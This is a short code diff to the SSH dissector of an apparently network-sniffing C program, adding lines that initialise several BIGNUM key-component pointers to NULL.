@@ -146,6 +146,10 @@ FUNC_DECODER(dissector_ssh)
    BIGNUM *h_n, *s_n, *m_h_n, *m_s_n;
    BIGNUM *h_e, *s_e, *m_h_e, *m_s_e;
    BIGNUM *h_d, *s_d, *m_h_d, *m_s_d;
+   h_n = h_e = h_d = NULL;
+   s_n = s_e = s_d = NULL;
+   m_h_n = m_h_e = m_h_d = NULL;
+   m_s_n = m_s_e = m_s_d = NULL;
 #endif
 
    /* don't complain about unused var */
